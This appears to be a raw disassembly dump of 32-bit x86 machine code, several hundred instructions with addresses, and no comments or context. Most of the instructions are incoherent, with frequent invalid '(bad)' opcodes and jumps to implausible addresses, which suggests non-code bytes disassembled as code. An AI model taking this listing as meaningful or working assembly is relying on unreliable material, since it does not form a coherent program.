  42144b:	adc    eax,DWORD PTR [ebx+0x18e78300]
  421451:	dec    ebp
  421453:	push   edi
  421454:	inc    DWORD PTR [eax]
  421456:	int3   
  421457:	in     eax,0xc4
  421459:	add    BYTE PTR [edi-0x1f],ch
  42145c:	add    bh,bh
  42145e:	int3   
  42145f:	out    dx,al
  421460:	(bad)  
  421461:	int3   
  421462:	daa    
  421463:	and    al,0x83
  421465:	add    bh,bh
  421467:	dec    ebx
  421468:	ret    
  421469:	add    BYTE PTR [eax+0x3e],ch
  42146c:	add    bh,bh
  42146e:	call   FWORD PTR [ecx-0x59]
  421471:	int3   
  421472:	and    al,ah
  421474:	int3   
  421475:	add    BYTE PTR [eax],al
  421477:	clc    
  421478:	dec    edi
  421479:	add    BYTE PTR [esi+0x838316],dl
  42147f:	js     0x42146e
  421481:	(bad)  
  421482:	cmp    al,0x4
  421484:	add    BYTE PTR [eax],al
  421486:	push   DWORD PTR [eax]
  421488:	lods   al,BYTE PTR ds:[esi]
  421489:	mov    DWORD PTR [eax-0x1a],ebx
  42148c:	inc    DWORD PTR [ebx-0xdb7001]
  421492:	in     al,0xbc
  421494:	inc    DWORD PTR [eax]
  421496:	dec    ebx
  421498:	dec    esi
  421499:	dec    DWORD PTR ds:0x83838945
  42149f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a0:	jmp    0xff7afca4
  4214a5:	add    DWORD PTR [eax],0x30
  4214a8:	mov    edx,0xff643300
  4214ad:	dec    esp
  4214af:	aam    0x14
  4214b1:	mov    DWORD PTR [eax-0xb5],edx
  4214b7:	pushf  
  4214b8:	sahf   
  4214b9:	add    BYTE PTR [ebx],bl
  4214bb:	cmc    
  4214bc:	mov    DWORD PTR [eax],eax
  4214be:	mov    DWORD PTR [edi+0x6f],esi
  4214c1:	jmp    DWORD PTR [ebx+edx*2+0x0]
  4214c5:	inc    DWORD PTR [ebx-0x2008830]
  4214cb:	add    DWORD PTR [ebx-0xd2d7c77],eax
  4214d1:	int3   
  4214d2:	jbe    0x421519
  4214d4:	(bad)  
  4214d5:	inc    DWORD PTR [ebx+0xfccac9c]
  4214db:	(bad)  
  4214de:	add    edi,0xffffffc5
  4214e1:	jmp    FWORD PTR [esi+0x6c]
  4214e4:	mov    DWORD PTR [ebx-0x3328cf01],eax
  4214ea:	sub    ch,0xff
  4214ed:	add    DWORD PTR [ebx+0x1dcc1d74],0xfffffffb
  4214f4:	mov    edi,edi
  4214f6:	add    BYTE PTR [eax],dh
  4214f8:	add    BYTE PTR cs:[ecx],bh
  4214fb:	sub    bh,bh
  4214fd:	add    DWORD PTR [ebx-0x7d00ca78],0xffffffe1
  421504:	add    BYTE PTR [eax],al
  421506:	add    BYTE PTR [edx-0x6156ffae],bh
  42150c:	cmp    edi,0x0
  42150f:	sahf   
  421510:	inc    ebx
  421511:	add    bh,bh
  421513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421514:	(bad)  
  421515:	inc    DWORD PTR [ebx+0x1600d5b9]
  42151b:	xchg   ebp,eax
  42151c:	add    BYTE PTR [eax],al
  42151e:	and    DWORD PTR [edx+0x13],0xffffffff
  421522:	push   edx
  421523:	push   ds
  421524:	inc    DWORD PTR [eax]
  421526:	push   esi
  421528:	sbb    bh,bh
  42152a:	cmp    dh,BYTE PTR [ecx]
  42152c:	int3   
  42152d:	mov    DWORD PTR [eax],eax
  42152f:	jne    0x421510
  421531:	add    BYTE PTR [edx+ebp*1-0x5a00ff01],cl
  421538:	lods   eax,DWORD PTR ds:[esi]
  421539:	mov    ebp,edi
  42153b:	mov    eax,ds:0x5300ff83
  421540:	loop   0x4214c5
  421542:	mov    al,BYTE PTR [eax]
  421544:	int3   
  421545:	dec    esp
  421547:	and    eax,0x15bf89f7
  42154c:	inc    DWORD PTR [ebx-0x7c85e400]
  421552:	inc    edx
  421553:	sub    cl,ah
  421555:	add    BYTE PTR [eax],al
  421557:	or     dh,BYTE PTR [edx-0xb8901]
  42155d:	dec    esp
  42155f:	add    esp,DWORD PTR [eax]
  421561:	jmp    FWORD PTR [edi-0xff36]
  421567:	adc    DWORD PTR [edi-0x1],0xffff2e7b
  42156e:	add    BYTE PTR [edi],ch
  421570:	ud0    eax,DWORD PTR [ebp-0x7c7c00e2]
  421577:	or     dl,0x0
  42157a:	dec    esp
  42157b:	aaa    
  42157c:	cmp    edi,0x0
  42157f:	inc    ebp
  421580:	das    
  421581:	add    dl,ch
  421583:	cmp    BYTE PTR [eax],al
  421585:	(bad)  
  421586:	call   FWORD PTR [eax-0x37]
  421589:	add    DWORD PTR [esi+eax*1],0xffffffff
  42158d:	dec    DWORD PTR [ecx-0x70ff9c6b]
  421593:	inc    esi
  421594:	cmp    edi,0xffffff89
  421597:	cmp    BYTE PTR [eax-0x7d],bh
  42159a:	adc    eax,0xff00004b
  42159f:	int3   
  4215a0:	je     0x4215a1
  4215a2:	or     ebp,esi
  4215a4:	(bad)  
  4215a5:	dec    esp
  4215a7:	xchg   esp,eax
  4215a8:	mov    BYTE PTR [eax],al
  4215aa:	mov    ss,WORD PTR [eax+eax*1-0x7fddff01]
  4215b1:	jmp    DWORD PTR [edi-0xff00c5]
  4215b7:	xchg   BYTE PTR [ebx+eax*4],ah
  4215ba:	sub    eax,0xff83ff2c
  4215bf:	(bad)  
  4215c0:	loop   0x4215c1
  4215c2:	and    eax,DWORD PTR [eax+0x18383ff]
  4215c8:	and    al,0xff
  4215ca:	jmp    0x41991a
  4215cf:	sub    BYTE PTR [ecx-0x1],0xbd
  4215d3:	push   ebx
  4215d4:	add    bh,bh
  4215d6:	and    edx,0x5f
  4215d9:	add    BYTE PTR [ebp-0xff0020],dh
  4215df:	adc    eax,0x8678ffba
  4215e4:	(bad)  
  4215e5:	(bad)  
  4215e6:	dec    DWORD PTR [esi-0x6757ff2d]
  4215ec:	add    bh,bh
  4215ee:	dec    DWORD PTR [eax+0xd560083]
  4215f4:	dec    DWORD PTR [ecx+0xb8d383]
  4215fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215fb:	ud0    edi,edi
  4215fe:	add    ah,ah
  421600:	std    
  421601:	int3   
  421602:	jl     0x421627
  421604:	add    BYTE PTR [ebx+0xa94e83],al
  42160a:	es and eax,0xfa83ff00
  421610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421611:	call   DWORD PTR [ebx+0x3c]
  421614:	add    DWORD PTR [ebx-0x33fd1834],0x24
  42161b:	rol    BYTE PTR [ebx+0x3ffd8983],0x0
  421622:	mov    esi,0x8300ff85
  421627:	sbb    eax,0x26b2ff4a
  42162c:	add    bh,bh
  42162e:	add    BYTE PTR [esi+0x38],bl
  421631:	call   FWORD PTR [edi]
  421633:	data16 add ah,cl
  421636:	push   DWORD PTR [edi*2+0x99ff83]
  42163d:	dec    DWORD PTR [ecx+0x1aff7861]
  421643:	test   BYTE PTR [ebx+0xf90ffcc],0xff
  42164a:	jbe    0x4215d9
  42164c:	add    ah,cl
  42164e:	dec    DWORD PTR [esi-0x6844ffb9]
  421654:	add    bh,bh
  421656:	add    BYTE PTR [ecx-0x5a],al
  421659:	inc    DWORD PTR [edx+eax*2+0x7effff00]
  421660:	nop
  421661:	inc    DWORD PTR [ecx]
  421663:	(bad)  
  421664:	dec    DWORD PTR [ecx-0x9f137d]
  42166a:	xchg   ebx,eax
  42166b:	cmp    al,0xff
  42166d:	add    bh,bh
  42166f:	or     ch,0x0
  421672:	push   ecx
  421673:	mov    ebx,0x130000cc
  421678:	sbb    DWORD PTR [eax],eax
  42167a:	aad    0xf5
  42167c:	inc    DWORD PTR [eax]
  42167e:	call   FWORD PTR [esp+eax*2-0x6dc87d]
  421685:	mov    DWORD PTR [eax],eax
  421687:	xchg   BYTE PTR [esi-0xfb3a01],al
  42168d:	inc    DWORD PTR [eax]
  42168f:	cli    
  421690:	pusha  
  421691:	int3   
  421692:	xor    BYTE PTR [ecx-0x1],al
  421695:	add    bh,bh
  421697:	ficomp WORD PTR [edi+edi*8-0x763804]
  42169e:	mov    DWORD PTR [edx],ebx
  4216a0:	sahf   
  4216a1:	(bad)  
  4216a2:	fistp  QWORD PTR [eax+eax*1]
  4216a5:	add    BYTE PTR [ecx+0x57ff61b8],cl
  4216ab:	mov    ds:0xe789ffff,eax
  4216b0:	mov    bh,bh
  4216b2:	sar    edx,0x83
  4216b5:	inc    DWORD PTR [eax]
  4216b7:	adc    edi,DWORD PTR [ebp+0x1f9c00]
  4216bd:	inc    DWORD PTR [ebx-0x72006a49]
  4216c3:	sub    al,0x0
  4216c5:	int3   
  4216c6:	(bad)  
  4216c7:	mov    eax,0x658c00ef
  4216cc:	(bad)  
  4216cd:	inc    DWORD PTR [ebx-0x280003e4]
  4216d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216d4:	(bad)  
  4216d5:	(bad)  
  4216d6:	call   DWORD PTR [eax]
  4216d8:	out    0x0,al
  4216da:	outs   dx,BYTE PTR ds:[esi]
  4216db:	mov    ebp,0xecc0083
  4216e0:	je     0x4216e1
  4216e2:	retf   
  4216e3:	test   BYTE PTR [ebx-0xebdff01],0x0
  4216ea:	je     0x421724
  4216ec:	add    BYTE PTR [eax],al
  4216ee:	add    BYTE PTR [eax+0x43d0837e],dh
  4216f4:	add    BYTE PTR [eax],al
  4216f6:	add    BYTE PTR [eax],cl
  4216f8:	dec    ecx
  4216f9:	add    BYTE PTR [edi],cl
  4216fb:	dec    edi
  4216fc:	add    DWORD PTR [eax],0x0
  4216ff:	and    eax,0x66f4ff59
  421704:	(bad)  
  421705:	(bad)  
  421706:	jmp    FWORD PTR [esi]
  421708:	pop    ss
  421709:	call   DWORD PTR [eax+0x2e]
  42170c:	add    bh,bh
  42170e:	call   DWORD PTR [edi]
  421710:	out    0xff,eax
  421712:	sar    edi,cl
  421714:	int3   
  421715:	mov    edi,edi
  421717:	stc    
  421718:	test   eax,0xff8e55ff
  42171d:	inc    DWORD PTR [eax]
  42171f:	repnz sbb eax,0x83525aff
  421725:	add    BYTE PTR [eax],al
  421727:	add    eax,DWORD PTR [edi-0x1]
  42172a:	fst    DWORD PTR [ecx-0x1]
  42172d:	(bad)  
  42172e:	(bad)  
  42172f:	jns    0x4216cd
  421731:	add    cl,bh
  421733:	jl     0x421735
  421735:	int3   
  421736:	call   DWORD PTR [ecx-0x3a]
  421739:	and    DWORD PTR [eax],0x14
  42173c:	dec    DWORD PTR [ecx+0xaeafcc]
  421742:	and    cl,dl
  421744:	int3   
  421745:	add    BYTE PTR [eax],al
  421747:	jns    0x4216da
  421749:	call   FWORD PTR [ebx-0x5f]
  42174c:	inc    DWORD PTR [eax]
  42174e:	jmp    DWORD PTR [edi+0x7]
  421751:	clc    
  421752:	add    bh,bh
  421754:	xor    DWORD PTR [eax],eax
  421756:	inc    DWORD PTR [ebx+0x0]
  421759:	dec    DWORD PTR [edx-0x77]
  42175c:	mov    BYTE PTR [edi-0x34],dl
  42175f:	stos   DWORD PTR es:[edi],eax
  421760:	rol    BYTE PTR [edi],1
  421762:	(bad)  
  421763:	push   DWORD PTR [ebp+0x23ff00]
  421769:	int3   
  42176a:	jae    0x4216ef
  42176c:	adc    ebp,DWORD PTR [ecx+0xcf0c9ff]
  421772:	(bad)  
  421773:	jmp    FWORD PTR [esi]
  421775:	mov    edi,edi
  421777:	bound  eax,QWORD PTR [eax]
  421779:	call   FWORD PTR [ebx]
  42177b:	add    BYTE PTR [eax],dl
  42177d:	test   edi,edi
  42177f:	(bad)  
  421780:	ja     0x4217e5
  421782:	(bad)  
  421783:	jmp    FWORD PTR [eax]
  421785:	add    bh,bh
  421787:	xchg   esp,eax
  421788:	add    bh,bh
  42178a:	bnd call DWORD PTR [eax+eax*1-0x77]
  42178f:	add    cl,0xd2
  421792:	add    BYTE PTR [eax],al
  421794:	aaa    
  421795:	(bad)  
  421796:	dec    DWORD PTR [ebp-0x1]
  421799:	(bad)  
  42179a:	jle    0x421768
  42179c:	jmp    0xcc831797
  4217a1:	in     eax,0x0
  4217a3:	(bad)  
  4217a4:	jns    0x4217a5
  4217a6:	mov    DWORD PTR [eax+eax*1-0x13ff6901],ebp
  4217ad:	add    bh,bh
  4217af:	push   ebx
  4217b0:	push   edx
  4217b1:	xchg   bh,bh
  4217b3:	add    ch,bl
  4217b5:	inc    DWORD PTR [eax]
  4217b7:	push   eax
  4217b8:	mov    edi,edi
  4217ba:	loop   0x4217bb
  4217bc:	pop    esp
  4217bd:	pop    ebx
  4217be:	(bad)  
  4217bf:	mov    ecx,0x895362
  4217c4:	cmp    eax,0xfffdcccc
  4217c9:	inc    DWORD PTR [edx]
  4217cb:	cmp    esp,0xfffffffe
  4217ce:	xor    DWORD PTR [edi-0x9652],0x25
  4217d5:	inc    DWORD PTR [eax]
  4217d7:	xor    bh,bh
  4217d9:	(bad)  
  4217da:	jge    0x4217db
  4217dc:	inc    ebx
  4217dd:	mov    ebp,0x91d825ff
  4217e2:	dec    DWORD PTR [ecx-0x7200007e]
  4217e8:	mov    edi,edi
  4217ea:	push   0x0
  4217ec:	data16 aam 0xff
  4217ef:	outs   dx,BYTE PTR ds:[esi]
  4217f0:	add    BYTE PTR [ecx],ch
  4217f2:	add    bh,bh
  4217f4:	adc    eax,DWORD PTR [ebx-0x33d901]
  4217fa:	sub    BYTE PTR [eax],al
  4217fc:	inc    esi
  4217fd:	or     edi,edi
  4217ff:	shr    BYTE PTR [ebp+0x5000831b],0x89
  421806:	jmp    DWORD PTR [ecx-0x7d]
  421809:	add    BYTE PTR [ecx],dh
  42180b:	add    BYTE PTR [ebx-0xf],bh
  42180e:	jmp    DWORD PTR [ebp-0xffdaac]
  421814:	(bad)  
  421815:	(bad)  
  421816:	call   FWORD PTR [ecx+ecx*4-0x7d]
  42181a:	xor    eax,0xff8b8f89
  42181f:	sub    DWORD PTR [ebx-0x4d],ebp
  421822:	add    BYTE PTR [ecx-0x777c004e],cl
  421828:	dec    esp
  42182a:	cmp    eax,0x83599d00
  42182f:	mov    BYTE PTR [esi],dh
  421831:	sub    al,BYTE PTR [eax]
  421833:	int3   
  421834:	bound  eax,QWORD PTR [eax]
  421836:	jmp    DWORD PTR [edi+0x0]
  421839:	call   DWORD PTR [ebx-0xb6bf01]
  42183f:	cmp    al,0x68
  421841:	jge    0x421843
  421843:	cmp    DWORD PTR [eax-0x34],0xffffffff
  421847:	mov    edi,0xe3ff00
  42184c:	mov    edi,ebp
  42184e:	jmp    DWORD PTR [esi+0x89dc9a]
  421854:	xchg   ebp,eax
  421855:	(bad)  
  421856:	call   esi
  421858:	add    DWORD PTR [ebx+0x5580ff5f],0xffffffff
  42185f:	or     DWORD PTR [esi],edi
  421861:	sbb    bh,bh
  421863:	cmp    DWORD PTR [ecx-0x1],0xffffff89
  421867:	and    bh,bh
  421869:	add    BYTE PTR [esi-0x7d],ch
  42186c:	xor    eax,0x859d00be
  421871:	imul   edi,edi,0xffffffff
  421874:	inc    esi
  421875:	inc    DWORD PTR [eax]
  421877:	pop    ds
  421878:	add    bh,bh
  42187a:	mov    ch,0xcc
  42187c:	retf   
  42187d:	aam    0x0
  42187f:	test   eax,0xff1575
  421884:	add    eax,DWORD PTR [ebx+0xffbeff]
  42188a:	loop   0x42188b
  42188c:	aam    0xe3
  42188e:	(bad)  
  42188f:	cli    
  421890:	sbb    bl,BYTE PTR [eax+eax*1]
  421893:	(bad)  
  421894:	sti    
  421895:	(bad)  
  421896:	call   FWORD PTR [ebx-0x1]
  421899:	push   ecx
  42189b:	(bad)  
  42189c:	mov    edx,0x51540056
  4218a1:	dec    edi
  4218a2:	(bad)  
  4218a3:	(bad)  
  4218a4:	js     0x4218a6
  4218a6:	adc    DWORD PTR [ebx],0xffffffff
  4218a9:	dec    ebp
  4218ab:	or     DWORD PTR [ecx-0x419cff71],0x14
  4218b2:	(bad)  
  4218b3:	(bad)  
  4218b4:	jns    0x421839
  4218b6:	int3   
  4218b7:	adc    eax,DWORD PTR [ebx-0x5c00a300]
  4218bd:	call   DWORD PTR [ebp-0x1d]
  4218c1:	aad    0x0
  4218c3:	int3   
  4218c4:	mov    cl,0x0
  4218c6:	inc    DWORD PTR [ebp-0x1]
  4218c9:	(bad)  
  4218ca:	(bad)  
  4218cb:	jmp    DWORD PTR [edx+0x51460029]
  4218d1:	mov    al,ds:0x8305cc00
  4218d6:	mov    DWORD PTR [ebp+0x5ffff],esi
  4218dc:	das    
  4218dd:	add    edi,edi
  4218df:	add    al,0xe4
  4218e1:	adc    eax,0xff6c00ff
  4218e6:	jmp    DWORD PTR [esi-0x1]
  4218e9:	call   FWORD PTR [eax+0xc74f83]
  4218ef:	icebp  
  4218f0:	frstor [edi-0x338b0100]
  4218f6:	inc    DWORD PTR [edi-0x7d]
  4218f9:	xor    ebp,0xffffffff
  4218fc:	shl    eax,1
  4218fe:	mov    ebx,edi
  421900:	pop    es
  421901:	jle    0x421886
  421903:	add    BYTE PTR [ebx],ch
  421905:	int3   
  421906:	add    BYTE PTR [edi-0x7d],ch
  421909:	and    DWORD PTR [ebx],0xffffffff
  42190c:	mov    al,ds:0xea25003e
  421911:	inc    edx
  421912:	add    BYTE PTR [ebx+0x22ff0064],al
  421918:	int3   
  421919:	add    cl,cl
  42191b:	add    BYTE PTR [edx],dl
  42191d:	jmp    0x89cc:0x8ea226ff
  421924:	mov    eax,ds:0x8a00ff
  421929:	add    bh,bh
  42192b:	(bad)  
  42192c:	mov    edi,0xe6b2004f
  421931:	adc    BYTE PTR [eax],al
  421933:	jmp    edx
  421935:	mov    edi,edi
  421937:	adc    al,BYTE PTR [eax]
  421939:	push   DWORD PTR [esi]
  42193b:	jmp    DWORD PTR ds:0x6d120079
  421941:	add    eax,0xcc07ffff
  421946:	mov    DWORD PTR [eax-0x8a0100],edx
  42194c:	neg    BYTE PTR [ebx+0x0]
  42194f:	mov    ds:0xff8300dc,eax
  421954:	mov    ebx,0x2ffff
  421959:	call   DWORD PTR [eax+eax*1-0x4f]
  42195d:	imul   eax,DWORD PTR [ebx+0xeb0fa8],0xffffffff
  421964:	xor    cl,ah
  421966:	add    DWORD PTR [ebp-0x1],0x0
  42196a:	sbb    bh,bh
  42196c:	add    eax,DWORD PTR [edx]
  42196e:	int3   
  42196f:	retf   0x3745
  421972:	(bad)  
  421973:	inc    DWORD PTR [ebp-0x1]
  421976:	add    BYTE PTR [esi-0x1],ah
  421979:	add    BYTE PTR [ebx+0x0],al
  42197c:	and    edi,DWORD PTR [eax-0x7d]
  42197f:	cmp    DWORD PTR [ebx+ecx*2+0x0],0xffffffff
  421984:	stc    
  421985:	(bad)  
  421986:	push   DWORD PTR [eax-0x7c520077]
  42198c:	lods   al,BYTE PTR ds:[esi]
  42198d:	lods   al,BYTE PTR ds:[esi]
  42198e:	add    BYTE PTR [edi+eiz*2-0x66],dl
  421992:	add    BYTE PTR [eax],al
  421994:	rol    DWORD PTR [eax],0x0
  421997:	add    DWORD PTR [eax],0x0
  42199a:	xchg   ebp,eax
  42199b:	jmp    DWORD PTR [ecx+0x27d5ccf1]
  4219a1:	lea    eax,[eax]
  4219a3:	dec    DWORD PTR [edi+0x4cff83]
  4219a9:	cmp    DWORD PTR [eax-0x7d],0x6f
  4219ad:	mov    esi,0xd9153989
  4219b2:	inc    DWORD PTR [ebx+0x5f00ffd1]
  4219b8:	add    bh,bh
  4219ba:	push   edi
  4219bb:	(bad)  
  4219bc:	stc    
  4219bd:	sub    ah,cl
  4219bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219c0:	xor    BYTE PTR ds:0xff8900cc,cl
  4219c6:	jmp    edi
  4219c8:	add    ah,cl
  4219ca:	add    DWORD PTR [eax],0x2ff0f24
  4219d0:	dec    eax
  4219d1:	sub    eax,DWORD PTR [eax]
  4219d3:	mov    DWORD PTR [edi+0x0],ecx
  4219d6:	add    BYTE PTR [eax],dl
  4219d8:	(bad)  
  4219d9:	jmp    FWORD PTR [edi-0x7cd9b801]
  4219df:	fs clc 
  4219e1:	sahf   
  4219e2:	add    ah,cl
  4219e4:	idiv   bh
  4219e6:	inc    DWORD PTR [ebp+0x0]
  4219e9:	mov    eax,ecx
  4219eb:	and    DWORD PTR [ecx],0xffffffcd
  4219ee:	add    BYTE PTR [esi+0x6d],al
  4219f1:	push   ss
  4219f2:	inc    DWORD PTR [eax]
  4219f4:	sahf   
  4219f5:	(bad)  
  4219f6:	jmp    FWORD PTR [edi-0x7cf40034]
  4219fc:	fs fdiv st(7),st
  4219ff:	out    dx,eax
  421a00:	cdq    
  421a01:	ror    BYTE PTR [ecx-0x5301],1
  421a07:	cmp    eax,DWORD PTR [eax]
  421a09:	jmp    DWORD PTR [ebx-0x34]
  421a0c:	cs mov ch,0xff
  421a0f:	dec    esi
  421a10:	jbe    0x421a5b
  421a12:	inc    DWORD PTR [eax]
  421a14:	sbb    eax,DWORD PTR [ebx-0xff4977]
  421a1a:	dec    esp
  421a1b:	add    BYTE PTR [esp+esi*2-0xf37b477],bl
  421a22:	add    BYTE PTR [eax],al
  421a24:	mov    al,ds:0xcc78ff00
  421a29:	int3   
  421a2a:	imul   eax,DWORD PTR [eax],0x23ff488c
  421a30:	iret   
  421a31:	xchg   BYTE PTR [eax],al
  421a33:	sbb    esi,0x0
  421a36:	add    BYTE PTR [edi-0xec3400],dl
  421a3c:	cmp    eax,0x275cff7a
  421a41:	repz (bad) 
  421a43:	jmp    esp
  421a45:	(bad)  
  421a46:	inc    DWORD PTR [edi]
  421a48:	mov    edi,edi
  421a4a:	mov    ch,0x0
  421a4c:	ret    
  421a4d:	xchg   ebx,eax
  421a4e:	adc    DWORD PTR [eax+eiz*2-0x77],0x0
  421a53:	add    BYTE PTR [esi-0x7c0f7d00],cl
  421a59:	jmp    DWORD PTR [edx-0x75f97d]
  421a5f:	in     eax,dx
  421a60:	lods   eax,DWORD PTR cs:[esi]
  421a62:	(bad)  
  421a63:	push   DWORD PTR [esi-0x7c78ff01]
  421a69:	add    bh,dl
  421a6b:	add    BYTE PTR [ecx],ch
  421a6d:	mov    edi,?
  421a6f:	jmp    0xff5a:0x83ff4979
  421a76:	dec    DWORD PTR [edi+0x6983ff]
  421a7c:	xor    eax,0x62a0ff29
  421a81:	(bad)  
  421a83:	add    dl,dh
  421a85:	inc    DWORD PTR [ebx-0x2d00007c]
  421a8b:	inc    DWORD PTR [ebp-0x1414ff05]
  421a91:	xlat   BYTE PTR ds:[ebx]
  421a92:	add    BYTE PTR [ebx+0x2ffff2a],al
  421a98:	int3   
  421a99:	mov    DWORD PTR [ecx-0x1],edi
  421a9c:	mov    dl,0xff
  421a9e:	add    dh,cl
  421aa0:	imul   edi,DWORD PTR [ebp-0x1],0x0
  421aa4:	cmp    edi,edi
  421aa6:	(bad)  
  421aa7:	jp     0x421aa9
  421aa9:	dec    DWORD PTR [edi+edi*8-0x61]
  421aad:	scas   eax,DWORD PTR es:[edi]
  421aae:	inc    DWORD PTR [edx-0x2]
  421ab1:	push   ss
  421ab2:	mov    edi,edi
  421ab4:	in     eax,dx
  421ab5:	(bad)  
  421ab6:	jmp    DWORD PTR [edi-0xb0001]
  421abc:	call   0xff21:0xb974ffa3
  421ac3:	add    BYTE PTR [edi-0xa4ff7d],ah
  421ac9:	add    BYTE PTR [ecx-0x34],cl
  421acc:	mov    edi,0x6f2dffb0
  421ad1:	mov    cl,0x89
  421ad3:	add    bh,ch
  421ad5:	or     esp,0x38
  421ad8:	add    BYTE PTR [eax],al
  421ada:	enter  0xbf83,0x8a
  421ade:	add    BYTE PTR [ebx+ebx*4-0x67c00aa],dl
  421ae5:	inc    DWORD PTR [eax]
  421ae7:	cmp    edi,edi
  421ae9:	add    BYTE PTR [edx-0x486d00],al
  421aef:	push   esp
  421af0:	adc    al,0x34
  421af2:	mov    DWORD PTR [eax],eax
  421af4:	sahf   
  421af5:	add    bh,bh
  421af7:	mov    WORD PTR [ebx-0x5effa87d],es
  421afd:	push   0x5b587b89
  421b02:	int3   
  421b03:	inc    eax
  421b05:	add    ah,cl
  421b07:	outs   dx,DWORD PTR ds:[esi]
  421b08:	inc    DWORD PTR [eax]
  421b0a:	je     0x421b0b
  421b0c:	jnp    0x421b35
  421b0e:	add    BYTE PTR [ebx],al
  421b10:	ins    BYTE PTR es:[edi],dx
  421b11:	les    eax,FWORD PTR [ebx-0x33e601]
  421b17:	and    eax,0x5ecccc
  421b1c:	aas    
  421b1d:	cmp    bh,0xe2
  421b20:	sub    ebp,esi
  421b22:	add    BYTE PTR [ecx+0x2900ff1a],cl
  421b28:	mov    DWORD PTR [eax],eax
  421b2a:	mov    cl,0x89
  421b2c:	ins    BYTE PTR es:[edi],dx
  421b2d:	stos   BYTE PTR es:[edi],al
  421b2e:	add    bl,cl
  421b30:	jmp    0x72429e99
  421b35:	mov    DWORD PTR [eax],eax
  421b37:	cmp    bh,0xff
  421b3a:	mov    al,0x0
  421b3c:	xchg   ah,dh
  421b3e:	or     DWORD PTR ds:0xff00745c,0xffffff87
  421b45:	add    bh,bh
  421b47:	popf   
  421b48:	add    bh,bh
  421b4a:	and    edi,edi
  421b4c:	add    DWORD PTR ss:[eax],eax
  421b4f:	adc    al,0x5c
  421b51:	xor    eax,DWORD PTR [eax]
  421b53:	adc    DWORD PTR [edi],0xffffffff
  421b56:	mov    esi,ebp
  421b58:	cmp    edi,0xffffffc9
  421b5b:	(bad)  
  421b5c:	call   0x24891b80
  421b61:	jae    0x421b62
  421b63:	jmp    FWORD PTR [edi+edi*8-0x337500]
  421b6a:	mov    bh,bh
  421b6c:	inc    esi
  421b6d:	dec    eax
  421b6e:	call   DWORD PTR [esi-0x7ccff2]
  421b74:	mov    bh,bh
  421b76:	push   DWORD PTR [edx-0x1]
  421b79:	mov    DWORD PTR [edi],edi
  421b7b:	call   DWORD PTR [eax-0x26b900bc]
  421b81:	and    edi,edi
  421b83:	push   esp
  421b85:	(bad)  
  421b86:	call   FWORD PTR [ebx+0x0]
  421b89:	push   DWORD PTR [ebp-0x7d]
  421b8c:	xor    eax,0xbe748370
  421b91:	mov    dh,0xff
  421b93:	or     DWORD PTR [ecx-0x1],0xffffffff
  421b97:	xor    eax,0x91ffff
  421b9c:	xor    eax,0x22f8004c
  421ba1:	jl     0x421ba2
  421ba3:	int3   
  421ba4:	test   eax,0x8f0083
  421ba9:	add    BYTE PTR [edx+0x3663ff],al
  421baf:	out    dx,al
  421bb0:	push   edi
  421bb1:	or     eax,DWORD PTR [eax]
  421bb3:	add    BYTE PTR [edx+0x0],cl
  421bb6:	dec    DWORD PTR [esi-0x1]
  421bb9:	inc    DWORD PTR [eax]
  421bbb:	add    BYTE PTR [edi+0x6ef80013],dh
  421bc1:	scas   eax,DWORD PTR es:[edi]
  421bc2:	inc    DWORD PTR [ebx-0x5aff0050]
  421bc8:	add    ah,cl
  421bca:	mov    eax,0x898ad3cc
  421bcf:	icebp  
  421bd0:	dec    esp
  421bd1:	mov    BYTE PTR [ecx-0x76768777],cl
  421bd7:	fs dec esp
  421bda:	and    edi,edi
  421bdc:	mov    eax,0x5b11ff16
  421be1:	out    dx,al
  421be2:	cmp    edi,0xffffff80
  421be5:	cmp    edi,0xffffff9f
  421be8:	add    DWORD PTR [eax],0x31
  421beb:	add    BYTE PTR [eax],ch
  421bed:	int3   
  421bee:	int3   
  421bef:	loopne 0x421b88
  421bf1:	pusha  
  421bf2:	(bad)  
  421bf3:	(bad)  
  421bf4:	jge    0x421b79
  421bf6:	inc    DWORD PTR [ebx]
  421bf8:	cmp    edi,0x6a
  421bfb:	call   FWORD PTR [esi+0x3]
  421bfe:	add    BYTE PTR [ebp-0x7cff745f],ch
  421c04:	and    bh,bh
  421c06:	adc    DWORD PTR [edi-0x1],0xffffffff
  421c0a:	retf   0x5cff
  421c0d:	push   ds
  421c0e:	adc    ebp,0x7e
  421c11:	dec    esp
  421c13:	(bad)  
  421c14:	jge    0x421c16
  421c16:	inc    DWORD PTR [edi+edi*8]
  421c19:	call   FWORD PTR [ebp-0x7d]
  421c1c:	jmp    0xc5a41c29
  421c21:	inc    ebp
  421c22:	or     esp,0xfffffff7
  421c25:	add    bh,bh
  421c27:	dec    edx
  421c28:	add    BYTE PTR [eax],al
  421c2a:	call   0x89f9f22f
  421c2f:	or     eax,0xffffba6a
  421c34:	cmp    al,0xff
  421c36:	jmp    FWORD PTR [ebp-0xf43301]
  421c3c:	xchg   DWORD PTR [eax-0x6d05f901],edi
  421c42:	(bad)  
  421c43:	push   DWORD PTR ds:0x24ffcc
  421c49:	mov    edi,esi
  421c4b:	int3   
  421c4c:	cmp    dl,BYTE PTR [edx-0x7d]
  421c4f:	mov    BYTE PTR [ebp-0x1a],dh
  421c52:	inc    DWORD PTR [ebx+0x1f8300ca]
  421c58:	add    bh,bh
  421c5a:	test   al,0xff
  421c5c:	lock add cl,ah
  421c5f:	es jg  0x421c2f
  421c62:	add    DWORD PTR [ebx+0x500ffb8],0xffffffff
  421c69:	add    BYTE PTR [edi+edi*8],ch
  421c6c:	jmp    0xffac:0x7fb383e1
  421c73:	(bad)  
  421c74:	(bad)  
  421c75:	inc    DWORD PTR [eax]
  421c77:	pop    es
  421c78:	(bad)  
  421c79:	call   FWORD PTR [ebp-0x1]
  421c7c:	jmp    0x15:0xa65ff68
  421c83:	and    DWORD PTR [ebp-0x33320001],0xffffff83
  421c8a:	rol    BYTE PTR [eax],0xe
  421c8d:	jmp    0xff83:0xca5e5b00
  421c94:	jb     0x421c1f
  421c96:	add    BYTE PTR [ebx-0x1],bl
  421c99:	dec    DWORD PTR [ebx-0x1]
  421c9c:	dec    edx
  421c9d:	jns    0x421c9e
  421c9f:	repnz scas al,BYTE PTR es:[edi]
  421ca1:	mov    ecx,0xaa8300
